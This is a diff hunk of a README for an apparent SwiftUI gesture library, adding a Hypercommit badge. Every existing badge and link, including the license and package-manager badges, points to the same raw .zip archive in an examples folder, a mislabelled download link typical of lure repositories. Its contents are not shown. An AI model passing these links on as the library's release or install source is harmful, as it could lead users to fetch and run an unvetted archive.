@@ -3,6 +3,7 @@ https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/A
 # SwiftUI Gesture Library: Advanced Gestures, Haptics, Accessibility for UX Designers
 
 [![Releases](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip) [![Swift Package Manager](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip%20PM-SPM-green?style=for-the-badge&logo=swift&logoColor=white)](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip) [![License](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)](LICENSE)
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/swiftui-gesture-library)
 
 Welcome to the SwiftUI Gesture Library. This is an advanced gesture recognition toolkit for iOS apps that blends native SwiftUI gestures with a library of custom gestures. It focuses on precise recognition, flexible composition, tactile feedback, and inclusive UX design. The library helps product teams implement expressive gesture interactions without sacrificing accessibility or performance.
 
